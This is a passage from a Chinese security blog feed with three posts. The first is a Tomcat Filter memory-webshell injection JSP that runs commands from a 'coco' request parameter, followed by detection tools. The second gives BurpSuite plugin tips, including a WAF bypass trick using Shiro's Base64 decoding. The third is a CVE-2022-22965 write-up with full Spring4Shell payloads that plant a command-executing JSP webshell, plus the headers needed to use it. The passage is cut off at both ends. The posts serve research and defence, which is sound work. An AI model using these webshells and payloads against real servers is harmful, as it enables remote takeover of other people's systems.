punctuation">(</span>applicationContext<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">Filter</span> filter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Filter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> servletRequest<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> servletResponse<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> filterChain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">HttpServletRequest</span> req <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> servletRequest<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"coco"</span><span class="token punctuation">)</span> <span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token class-name">InputStream</span> in <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"coco"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">Scanner</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span>in<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">useDelimiter</span><span class="token punctuation">(</span><span class="token string">"\\A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">String</span> output <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> s<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">;</span>          servletResponse<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>        filterChain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">,</span> servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token comment">//把创建好的filter包装为FilterDef对象</span>  <span class="token class-name">String</span> filterName <span class="token operator">=</span> <span class="token string">"coco"</span><span class="token punctuation">;</span>  <span class="token class-name">FilterDef</span> filterDef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterDef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  filterDef<span class="token punctuation">.</span><span class="token function">setFilter</span><span class="token punctuation">(</span>filter<span class="token punctuation">)</span><span class="token punctuation">;</span>  filterDef<span class="token punctuation">.</span><span class="token function">setFilterName</span><span class="token punctuation">(</span>filterName<span class="token punctuation">)</span><span class="token punctuation">;</span>  filterDef<span class="token punctuation">.</span><span class="token function">setFilterClass</span><span class="token punctuation">(</span>filter<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  standardContext<span class="token punctuation">.</span><span class="token function">addFilterDef</span><span class="token punctuation">(</span>filterDef<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//调用addFilterDef加入到filterDefs</span>  <span class="token comment">//创建FilterMap并且加入到filterMaps</span>  <span class="token class-name">FilterMap</span> filterMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  filterMap<span class="token punctuation">.</span><span class="token function">setFilterName</span><span class="token punctuation">(</span>filterName<span class="token punctuation">)</span><span class="token punctuation">;</span>  filterMap<span class="token punctuation">.</span><span class="token function">addURLPattern</span><span class="token punctuation">(</span><span class="token string">"/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  filterMap<span class="token punctuation">.</span><span class="token function">setDispatcher</span><span class="token punctuation">(</span><span class="token class-name">DispatcherType</span><span class="token punctuation">.</span>REQUEST<span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  standardContext<span class="token punctuation">.</span><span class="token function">addFilterMapBefore</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//从standardContext获取filterConfigs对象</span>  <span class="token class-name">Field</span> <span class="token class-name">Configs</span> <span class="token operator">=</span> standardContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"filterConfigs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">Configs</span><span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">Map</span> filterConfigs <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">)</span> <span class="token class-name">Configs</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>standardContext<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//利用反射创建filterConfig</span>  <span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> <span class="token class-name">ApplicationFilterConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">FilterDef</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">ApplicationFilterConfig</span> filterConfig <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationFilterConfig</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>standardContext<span class="token punctuation">,</span> filterDef<span class="token punctuation">)</span><span class="token punctuation">;</span>  filterConfigs<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>filterName<span class="token punctuation">,</span>filterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span>  out<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="内存马的排查"><a href="#内存马的排查" class="headerlink" title="内存马的排查"></a>内存马的排查</h2><p>参考天下大木头师傅，主要有两种排查方式：</p><h4 id="采用字节码的方式"><a href="#采用字节码的方式" class="headerlink" title="采用字节码的方式"></a>采用字节码的方式</h4><ol><li><a href="https://github.com/alibaba/arthas">https://github.com/alibaba/arthas</a></li><li><a href="https://github.com/LandGrey/copagent">https://github.com/LandGrey/copagent</a></li></ol><h4 id="扫描获取已有的filter"><a href="#扫描获取已有的filter" class="headerlink" title="扫描获取已有的filter"></a>扫描获取已有的filter</h4><p><a href="https://github.com/c0ny1/java-memshell-scanner">https://github.com/c0ny1/java-memshell-scanner</a><br>通过反射获取StandardContext里面所有的filter, <a href="https://gv7.me/articles/2020/filter-servlet-type-memshell-scan-capture-and-kill/">Filter/Servlet型内存马的扫描抓捕与查杀</a>:</p><pre class="line-numbers language-none"><code class="language-none">request.getSession().getServletContext() &#123;ApplicationContextFacade&#125;  -&gt; context &#123;ApplicationContext&#125;     -&gt; context &#123;StandardContext&#125;      * filterDefs      * filterMaps      * children      * servletMappings<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://mp.weixin.qq.com/s/x4pxmeqC1DvRi9AdxZ-0Lw">Tomcat源代码调试笔记-看不见的Shell</a></li><li><a href="https://mp.weixin.qq.com/s/n1wrjep4FVtBkOxLouAYfQ">冰蝎改造之适配基于tomcat Filter的无文件webshell </a></li><li><a href="https://www.yuque.com/ppwdd/xz9rb1/ahe2no">Java内存马专题套餐A</a></li><li><a href="https://mp.weixin.qq.com/s/gYGrdDtIldzrE7NHSxTDYQ">Tomcat基于Servlet的无文件webshell的相关技术研究</a></li><li><a href="https://y4er.com/post/java-deserialization-inject-behinder-memshell-note/">Java反序列化注入冰蝎内存马相关踩坑笔记</a></li><li><a href="http://blog.nsfocus.net/webshell-interceptor/">内存马的攻防博弈之旅</a></li><li><a href="https://gv7.me/articles/2020/filter-servlet-type-memshell-scan-capture-and-kill/">Filter/Servlet型内存马的扫描抓捕与查杀</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BurpSuite插件开发注意事项</title>
      <link href="/2022/04/11/burpsuite-ext-dev.html"/>
      <url>/2022/04/11/burpsuite-ext-dev.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x1-Base64的坑"><a href="#0x1-Base64的坑" class="headerlink" title="0x1. Base64的坑"></a>0x1. Base64的坑</h2><p>在JDK8版本里面，Java自带的<code>java.util.Base64</code>是根据RFC4648和RFC2045实现的，但是JDK7里面的<code>sun.misc.BASE64Encoder</code>，是RFC1521实现的。<br>这会导致<code>java.util.Base64</code>解码JDK7版本的Base64发生错误：<code>Illegal base64 character</code>。</p><p>可以使用shiro的Base64解决，增加maven依赖:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">></span></span>    <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">></span></span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">></span>    <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">></span></span>shiro<span class="token operator">-</span>core<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">></span>    <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">></span></span><span class="token number">1.6</span><span class="token number">.0</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>PS: chybeta师傅在漏洞百出里面提出过，Shiro在Base64解码的时候会丢弃非Base64字符串，所以可以利用这一点绕过WAF防火墙，比如填充垃圾字符串。</p><h2 id="0x2-RSA公私钥"><a href="#0x2-RSA公私钥" class="headerlink" title="0x2. RSA公私钥"></a>0x2. RSA公私钥</h2><p>Python加解密的时候，使用的是PKCS#1格式的公私钥：</p><pre class="line-numbers language-none"><code class="language-none"># 公钥-----BEGIN RSA PUBLIC KEY----------END RSA PUBLIC KEY-----  # 私钥-----BEGIN RSA PRIVATE KEY----------END RSA PRIVATE KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是在Java里面需要使用PKCS#8格式:</p><pre class="line-numbers language-none"><code class="language-none"># 公钥-----BEGIN PUBLIC KEY----------END PUBLIC KEY-----  # 私钥-----BEGIN PRIVATE KEY----------END PRIVATE KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>PKCS#1私钥转换为PKCS#8格式: <code>openssl pkcs8 -topk8 -inform PEM -in rsa_private.pem -outform pem -nocrypt -out pkcs8.pem</code></p><p>RSA根据PKCS#8私钥生成公钥:  <code>openssl rsa -in pkcs8.pem -out rsa_public.pem -pubout</code></p><h2 id="0x3-插件打包"><a href="#0x3-插件打包" class="headerlink" title="0x3. 插件打包"></a>0x3. 插件打包</h2><p>在插件开发完成之后，如果依赖有第三方的Jar包，需要把第三方的依赖也打包进去，修改pom.xml文件的build模块，加入maven的插件配置:</p><pre class="line-numbers language-none"><code class="language-none">&lt;build&gt;       &lt;plugins&gt;           &lt;plugin&gt;               &lt;groupId&gt;org.apache.maven.plugins&lt;&#x2F;groupId&gt;               &lt;artifactId&gt;maven-compiler-plugin&lt;&#x2F;artifactId&gt;               &lt;configuration&gt;                   &lt;source&gt;8&lt;&#x2F;source&gt;                   &lt;target&gt;8&lt;&#x2F;target&gt;               &lt;&#x2F;configuration&gt;           &lt;&#x2F;plugin&gt;           &lt;plugin&gt;               &lt;artifactId&gt;maven-assembly-plugin&lt;&#x2F;artifactId&gt;               &lt;configuration&gt;                   &lt;archive&gt;                       &lt;manifest&gt;                           &lt;mainClass&gt;burp.BurpExtender&lt;&#x2F;mainClass&gt;                       &lt;&#x2F;manifest&gt;                   &lt;&#x2F;archive&gt;                   &lt;descriptorRefs&gt;                       &lt;descriptorRef&gt;jar-with-dependencies&lt;&#x2F;descriptorRef&gt;                   &lt;&#x2F;descriptorRefs&gt;               &lt;&#x2F;configuration&gt;           &lt;&#x2F;plugin&gt;       &lt;&#x2F;plugins&gt;   &lt;&#x2F;build&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后打包插件:</p><pre class="line-numbers language-none"><code class="language-none">mvn clean mvn clean compile assembly:single  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="0x4-插件调试"><a href="#0x4-插件调试" class="headerlink" title="0x4. 插件调试"></a>0x4. 插件调试</h2><p>在开发插件的时候，如果需要对插件实时调试，可以选择先在官网下载安装社区版本的BurpSuite，然后启动Burpsuite:</p><pre class="line-numbers language-none"><code class="language-none">java -agentlib:jdwp&#x3D;transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;n,address&#x3D;5005 -jar burpsuite_community.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后新增远程调试:<br><img src="/2022/04/11/burpsuite-ext-dev/1.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2022-22965漏洞记录</title>
      <link href="/2022/04/06/CVE-2022-22965.html"/>
      <url>/2022/04/06/CVE-2022-22965.html</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞时间线"><a href="#漏洞时间线" class="headerlink" title="漏洞时间线"></a>漏洞时间线</h2><ul><li><p>CVE-2010-1622 Spring第一次<a href="https://www.inbreak.net/archives/377">爆发漏洞</a>，同时也影响了Struts(<a href="https://su18.org/post/struts2-2/#s2-020s2-021s2-022">S2-020/S2-021/S2-022</a>)</p></li><li><p>2017年9月10日 Oracle官方发文解释Java 9的module新特性</p></li><li><p>2022年3月29日 蚂蚁集团报告漏洞（CVE-2022-22965）</p></li></ul><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><ul><li><p>CVE-2010-1622/Struts(<a href="https://su18.org/post/struts2-2/#s2-020s2-021s2-022">S2-020/S2-021/S2-022</a>)</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>directory<span class="token operator">=</span>webapps<span class="token operator">/</span>ROOT<span class="token keyword">class</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>prefix<span class="token operator">=</span>shell<span class="token keyword">class</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>suffix<span class="token operator">=</span><span class="token punctuation">.</span>jsp<span class="token keyword">class</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>fileDateFormat<span class="token operator">=</span><span class="token number">1</span><span class="token keyword">class</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>pattern<span class="token operator">=</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">7</span>Bc2<span class="token operator">%</span><span class="token number">7D</span>i<span class="token operator">%</span><span class="token function">20if</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>j<span class="token operator">%</span><span class="token number">22.</span><span class="token function">equals</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>pwd<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7</span>B<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream<span class="token operator">%</span><span class="token number">20</span>in<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">7</span>Bc1<span class="token operator">%</span><span class="token number">7D</span>i<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>cmd<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span>int<span class="token operator">%</span><span class="token number">20</span>a<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span>byte<span class="token operator">%</span><span class="token number">5</span>B<span class="token operator">%</span><span class="token number">5D</span><span class="token operator">%</span><span class="token number">20</span>b<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span><span class="token number">20</span>new<span class="token operator">%</span><span class="token number">20</span>byte<span class="token operator">%</span><span class="token number">5</span>B2048<span class="token operator">%</span><span class="token number">5D</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token function">20while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">%</span><span class="token number">3D</span>in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">3D</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7</span>B<span class="token operator">%</span><span class="token number">20</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span><span class="token operator">%</span><span class="token function">20String</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">7D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">7D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">7</span>Bsuffix<span class="token operator">%</span><span class="token number">7D</span>i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>CVE-2022-22965在Java9新增了module之后:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token keyword">module</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>directory<span class="token operator">=</span>webapps<span class="token operator">/</span>ROOT<span class="token keyword">class</span><span class="token punctuation">.</span><span class="token keyword">module</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>prefix<span class="token operator">=</span>shell<span class="token keyword">class</span><span class="token punctuation">.</span><span class="token keyword">module</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>suffix<span class="token operator">=</span><span class="token punctuation">.</span>jsp<span class="token keyword">class</span><span class="token punctuation">.</span><span class="token keyword">module</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>fileDateFormat<span class="token operator">=</span><span class="token number">1</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token keyword">module</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>pattern<span class="token operator">=</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">7</span>Bc2<span class="token operator">%</span><span class="token number">7D</span>i<span class="token operator">%</span><span class="token function">20if</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>j<span class="token operator">%</span><span class="token number">22.</span><span class="token function">equals</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>pwd<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7</span>B<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream<span class="token operator">%</span><span class="token number">20</span>in<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">7</span>Bc1<span class="token operator">%</span><span class="token number">7D</span>i<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>cmd<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span>int<span class="token operator">%</span><span class="token number">20</span>a<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span>byte<span class="token operator">%</span><span class="token number">5</span>B<span class="token operator">%</span><span class="token number">5D</span><span class="token operator">%</span><span class="token number">20</span>b<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span><span class="token number">20</span>new<span class="token operator">%</span><span class="token number">20</span>byte<span class="token operator">%</span><span class="token number">5</span>B2048<span class="token operator">%</span><span class="token number">5D</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token function">20while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">%</span><span class="token number">3D</span>in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">3D</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7</span>B<span class="token operator">%</span><span class="token number">20</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span><span class="token operator">%</span><span class="token function">20String</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">7D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">7D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">7</span>Bsuffix<span class="token operator">%</span><span class="token number">7D</span>i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后访问webshell的时候，除了提供cmd的参数之外，还需要设置header头：</p><pre class="line-numbers language-none"><code class="language-none">headers &#x3D; &#123;&quot;suffix&quot;:&quot;%&gt;&#x2F;&#x2F;&quot;,            &quot;c1&quot;:&quot;Runtime&quot;,            &quot;c2&quot;:&quot;&lt;%&quot;,            &quot;DNT&quot;:&quot;1&quot;,            &quot;Content-Type&quot;:&quot;application&#x2F;x-www-form-urlencoded&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul><li>Java版本&gt;=JDK9 </li><li>Spirng运行在Tomcat环境下，以War包部署(Jar包的时候不存在)</li><li>方法入参是非基础类，不能是String，int等</li><li>接口使用了POJO参数绑定</li></ul><h3 id="注意事项"><a href="#注意事项" class="headerlink" 